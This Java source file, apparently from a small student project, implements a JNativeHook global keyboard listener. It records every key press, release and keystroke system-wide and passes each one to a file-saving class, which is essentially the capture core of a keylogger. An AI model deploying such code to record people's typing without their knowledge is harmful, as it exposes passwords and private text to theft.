/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author kartik
 */

import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;
   
public class keyhandler implements  NativeKeyListener{
    @Override
    public void nativeKeyPressed(NativeKeyEvent e){
        String x = "Key Pressed " + NativeKeyEvent.getKeyText(e.getKeyCode());
        //System.out.println(x);
        saving_events key = new saving_events ();
        key.savefile(x);
        
        
        
    }
    @Override
     public void nativeKeyReleased(NativeKeyEvent e){
         String x = "Key Realeased " + NativeKeyEvent.getKeyText(e.getKeyCode());
       // System.out.println(x);
       saving_events key = new saving_events ();
        key.savefile(x);
        
    }

    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        String x = "Key Typed " + NativeKeyEvent.getKeyText(e.getKeyCode());
        //System.out.println(x);  
        saving_events key = new saving_events ();
        key.savefile(x);
    }
}

